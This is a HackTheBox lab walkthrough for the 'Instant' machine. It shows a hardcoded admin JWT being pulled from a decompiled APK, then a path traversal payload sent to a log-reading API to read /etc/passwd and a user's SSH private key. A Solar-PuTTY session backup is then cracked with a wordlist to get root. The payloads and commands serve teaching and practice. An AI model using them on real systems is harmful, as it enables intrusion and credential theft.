
# HackTheBox - Instant

**Difficulty:** Medium | **OS:** Linux

---

## Summary

The web server hosts an Android application for download. Decompiling the APK exposes two additional virtual hosts and a hardcoded JWT belonging to the `admin` user. That token grants access to an authenticated API endpoint that is vulnerable to path traversal, which is used to read the SSH private key of the user `shirohige`. Post-exploitation enumeration reveals an encrypted Solar-PuTTY session backup; cracking it yields the root password, which is reused for a direct `su` to root.

**Attack path:** APK → hardcoded JWT → path traversal → SSH private key → Solar-PuTTY session backup → root

---

## Enumeration

### Port scan

```bash
nmap -p- --min-rate 10000 10.129.231.155
```

<img width="824" height="253" alt="Pasted image 20260804213827" src="https://github.com/user-attachments/assets/7df78fee-0a35-4126-96aa-703335ed6185" />
 _Only ports 22 (SSH) and 80 (HTTP) are open._

With SSH offering no unauthenticated attack surface, HTTP is the only viable entry point. A dedicated service/version scan adds little value here, as the banner and framework details are visible directly in the HTTP responses.

### Virtual host discovery

Browsing to `http://10.129.231.155` returns an error that discloses the expected hostname, `instant.htb`.

<img width="1178" height="704" alt="Pasted image 20260804214132" src="https://github.com/user-attachments/assets/75606a23-663a-472e-9e53-b374e23a6a6c" />


Adding the entry to the hosts file:

```bash
echo "10.129.231.155 instant.htb" | sudo tee -a /etc/hosts
```

---

## Web application

The landing page at `http://instant.htb/` presents a **DOWNLOAD NOW** button.

<img width="1643" height="831" alt="Pasted image 20260804214905" src="https://github.com/user-attachments/assets/ba8273a1-46ff-4cce-8c24-9299628c5351" />


The download resolves to an Android package (`instant.apk`).

<img width="258" height="68" alt="Pasted image 20260804214951" src="https://github.com/user-attachments/assets/cfa062d1-dc81-4114-9361-6ea44fc4b96f" />


### Decompiling the APK

```bash
jadx $(pwd)/instant.apk -d $(pwd)/instant
```

Searching the decompiled sources for references to the target domain:

```bash
grep -r '.htb' .
```

<img width="1891" height="467" alt="Pasted image 20260804222241" src="https://github.com/user-attachments/assets/b2d62c5a-9ce8-4e90-af0e-c6b374494915" />


Two additional virtual hosts are disclosed:

```
mywalletv1.instant.htb
swagger-ui.instant.htb
```

Both are added to `/etc/hosts` alongside `instant.htb`.

The same search also surfaces a hardcoded JSON Web Token embedded in the application source.

`./sources/com/instantlabs/instant/AdminActivities.java`

<img width="1891" height="475" alt="Pasted image 20260804224550" src="https://github.com/user-attachments/assets/a4331fe3-67b3-4953-986a-1d8b6142877f" />


Decoding the token (for example on jwt.io) confirms that the `role` claim identifies it as belonging to the `admin` user.

<img width="1408" height="737" alt="Pasted image 20260804224642" src="https://github.com/user-attachments/assets/1f6b997b-85fb-4486-bf41-310c1eacc05c" />


---

## API access

Requesting `http://swagger-ui.instant.htb` redirects to `http://swagger-ui.instant.htb/apidocs/`, which exposes the full API specification.

<img width="1919" height="1001" alt="Pasted image 20260804222618" src="https://github.com/user-attachments/assets/b3be1392-54a8-46e3-8d76-1d31867aad61" />


Supplying the recovered JWT authenticates the session with administrative privileges.

<img width="742" height="364" alt="Pasted image 20260804225213" src="https://github.com/user-attachments/assets/333e0f1e-4360-41c0-9d17-281447b8173e" />


### Identifying the vulnerable endpoint

Reviewing the documented routes, `/api/v1/admin/read/log` stands out: it reads a log file from the local filesystem based on a user-supplied parameter, which is a common source of path traversal / local file disclosure.

<img width="1663" height="744" alt="Pasted image 20260804225247" src="https://github.com/user-attachments/assets/a9df8d2a-df20-41b0-b224-64c79ae298f9" />


Expanding the endpoint shows the parameter description and an example value, confirming that a filename is passed directly.



---

## Exploitation - path traversal

The request is captured in Burp Suite and forwarded to Repeater (`Ctrl + R`).

The example response indicates that log files are read from `/home/shirohige/logs/`, so three levels of traversal are required to reach the filesystem root.

**Payload:**

```
../../../etc/passwd
```

**Request:**

```http
GET /api/v1/admin/read/log?log_file_name=../../../etc/passwd HTTP/1.1
Host: swagger-ui.instant.htb
Authorization: <JWT>
Accept: application/json
```


<img width="1577" height="751" alt="Pasted image 20260804234020" src="https://github.com/user-attachments/assets/2e5781a3-a66f-4cca-af57-7b344babc884" />


The traversal succeeds. `/etc/passwd` shows that `shirohige` is the only non-system account with an interactive shell, making it the obvious target.

### Retrieving the SSH private key

```
../../../home/shirohige/.ssh/id_rsa
```

<img width="1577" height="790" alt="Pasted image 20260804234212" src="https://github.com/user-attachments/assets/2cdeb81b-73e1-4313-9def-b8a6933c5d46" />


The key is returned inside a JSON string, with the line breaks escaped as `\n`. Rather than stripping characters manually, extract and unescape it cleanly:

```bash
echo '<id_rsa>' | sed 's/","//' | sed 's/"//' > id_rsa ; cat id_rsa
```

cleaner version:

```bash
echo '<id_rsa>' | sed 's/\\n/\n/g' > id_rsa
```

<img width="1355" height="833" alt="Pasted image 20260804234753" src="https://github.com/user-attachments/assets/79cb123c-f4f1-44d0-af1f-d222bfee87a8" />


Set the required permissions and verify that the key is well-formed and not passphrase-protected - `ssh-keygen -y` derives the public key and will prompt or fail otherwise:

```bash
chmod 600 id_rsa
ssh-keygen -yf id_rsa
```

<img width="1892" height="114" alt="Pasted image 20260804235834" src="https://github.com/user-attachments/assets/405c6138-4b86-4dab-8870-becacb676b97" />

---

## Initial foothold

```bash
ssh -i id_rsa shirohige@10.129.231.155
```



The user flag is located at `/home/shirohige/user.txt`.

---

## Privilege escalation

Since `shirohige` is the only regular user on the host, escalation must target root directly.

Enumerating non-standard locations:

```bash
ls -la /opt
find /opt -type f 2>/dev/null
```

This reveals a backup directory containing a Solar-PuTTY session file:

```
/opt/backups/Solar-PuTTY/sessions-backup.dat
```

<img width="678" height="123" alt="Pasted image 20260805000346" src="https://github.com/user-attachments/assets/3bbdfe16-42b2-4a14-97a3-5bc1c326c0b9" />


The file contains a Base64-encoded blob. Decoding it produces binary data rather than readable text, indicating that the session data is encrypted - which is expected behaviour for Solar-PuTTY session exports.

### Cracking the session backup

A public tool exists for this format: [ItsWatchMakerr/SolarPuttyCracker](https://github.com/ItsWatchMakerr/SolarPuttyCracker).

Transfer the file to the local machine (copying the Base64 string manually also works):

```bash
scp -i id_rsa shirohige@10.129.231.155:/opt/backups/Solar-PuTTY/sessions-backup.dat .
```

<img width="1888" height="206" alt="Pasted image 20260805001835" src="https://github.com/user-attachments/assets/e8ce051a-3968-45ea-a67e-b91ff5ed3020" />


```bash
git clone https://github.com/ItsWatchMakerr/SolarPuttyCracker
cd SolarPuttyCracker
python3 SolarPuttyCracker.py -w /usr/share/wordlists/rockyou.txt ../sessions-backup.dat
```

<img width="872" height="211" alt="Pasted image 20260805002420" src="https://github.com/user-attachments/assets/29148377-a469-4122-bb3c-b634d8d96ad7" />


The backup password is recovered: `estrella`

The decrypted session file contains the stored credentials for the root account.

<img width="827" height="769" alt="Pasted image 20260805002609" src="https://github.com/user-attachments/assets/045ab37c-4a62-428a-9bb6-f8bf6bc4d245" />


### Root

The recovered password is reused for the local root account, so a simple switch-user is sufficient:

```bash
su root
```

![[Pasted image 20260805002744.png]]

```bash
cat /root/root.txt
cat /home/shirohige/user.txt
```

